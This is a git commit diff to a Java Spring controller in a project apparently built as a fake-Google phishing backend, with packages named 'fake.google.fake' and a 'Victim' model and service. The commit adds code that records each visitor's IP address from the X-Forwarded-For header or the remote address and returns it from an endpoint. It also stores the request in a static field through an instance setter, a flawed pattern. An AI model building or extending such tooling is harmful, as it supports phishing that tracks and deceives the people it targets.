91ae44b0e0b3263a3ab8d4ef0004a6306685d2af
kali <primat.2000@mail.ru>
2020-11-13 04:49:27 +0500

    yangilandi

--- src/main/java/fake/google/fake/controller/RestController.java
+++ src/main/java/fake/google/fake/controller/RestController.java
@@ -2,16 +2,25 @@ package fake.google.fake.controller;
 
 import fake.google.fake.model.Victim;
 import fake.google.fake.service.VictimService;
+import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.http.ResponseEntity;
 import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.PostMapping;
 import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
 
+import javax.servlet.http.HttpServletRequest;
+
 @org.springframework.web.bind.annotation.RestController
 @RequestMapping("api")
 public class RestController {
     private final VictimService victimService;
+
+    private static HttpServletRequest request;
+
+    public void setRequest(HttpServletRequest request) {
+        this.request = request;
+    }
 
     public RestController(VictimService victimService) {
         this.victimService = victimService;
@@ -23,9 +32,23 @@ public class RestController {
     }
 
 
+    private static String getClientIp() {
+
+        String remoteAddr = "";
+
+        if (request != null) {
+            remoteAddr = request.getHeader("X-FORWARDED-FOR");
+            if (remoteAddr == null || "".equals(remoteAddr)) {
+                remoteAddr = request.getRemoteAddr();
+            }
+        }
+
+        return remoteAddr;
+    }
+
     @GetMapping("web")
     public ResponseEntity trans(){
-        return ResponseEntity.ok("aaaa");
+        return ResponseEntity.ok(getClientIp());
     }
 
 }
